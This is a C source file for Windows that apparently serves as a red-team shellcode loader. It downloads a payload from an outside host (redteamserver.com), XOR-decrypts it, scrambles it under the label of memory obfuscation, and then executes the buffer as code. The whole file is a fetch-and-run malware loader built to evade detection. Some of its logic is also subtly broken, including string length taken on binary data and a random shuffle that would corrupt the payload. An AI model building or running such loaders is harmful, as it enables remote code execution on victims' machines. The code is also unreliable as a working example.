#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wininet.h>

// XOR Encryption Function
void xor_encrypt_decrypt(char *input, char *key) {
    int dataLen = strlen(input);
    int keyLen = strlen(key);
    for (int i = 0; i < dataLen; i++) {
        input[i] = input[i] ^ key[i % keyLen];
    }
}

// Memory Obfuscation - Bit Inversion
void manipulate_memory(char *data) {
    char *alias = data;
    while (*alias) {
        *alias = ~(*alias);
        alias++;
    }
}

// Memory Obfuscation - Byte Shuffling
void shuffle_memory(char *data, int dataLen) {
    for (int i = 0; i < dataLen - 1; i++) {
        int j = i + rand() / (RAND_MAX / (dataLen - i) + 1);
        char temp = data[j];
        data[j] = data[i];
        data[i] = temp;
    }
}

// Function to download encrypted and encoded payload from a web server
BOOL download_payload(const char *url, char **payload, int *payloadLength) {
    HINTERNET hInternet, hConnect;

    hInternet = InternetOpen("Loader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        fprintf(stderr, "Error initializing WinINet\n");
        return FALSE;
    }

    hConnect = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        fprintf(stderr, "Error opening URL\n");
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    // Determine the size of the payload
    DWORD contentLength;
    DWORD bufferSize = sizeof(DWORD);
    if (!HttpQueryInfo(hConnect, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &contentLength, &bufferSize, NULL)) {
        fprintf(stderr, "Error querying content length\n");
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    *payload = (char *)malloc(contentLength);
    if (*payload == NULL) {
        fprintf(stderr, "Error allocating memory\n");
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    DWORD bytesRead;
    if (!InternetReadFile(hConnect, *payload, contentLength, &bytesRead)) {
        fprintf(stderr, "Error reading payload\n");
        free(*payload);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    *payloadLength = bytesRead;

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return TRUE;
}

int main() {
    // URL of the Red Team web server hosting the encrypted and encoded Go payload
    const char *payloadUrl = "http://redteamserver.com/go_payload.bin";

    char *encryptedPayload;
    int encryptedPayloadLength;

    if (!download_payload(payloadUrl, &encryptedPayload, &encryptedPayloadLength)) {
        fprintf(stderr, "Payload download failed\n");
        return -1;
    }

    // XOR decryption key
    char key[] = "ComplexKey";

    // Decrypt the payload using XOR
    xor_encrypt_decrypt(encryptedPayload, key);

    // Memory Obfuscation - Bit Inversion
    manipulate_memory(encryptedPayload);

    // Memory Obfuscation - Byte Shuffling
    shuffle_memory(encryptedPayload, encryptedPayloadLength);

    // Cast the payload to a function and execute it
    void (*payloadFunction)() = (void (*)())encryptedPayload;
    payloadFunction();

    return 0;
}

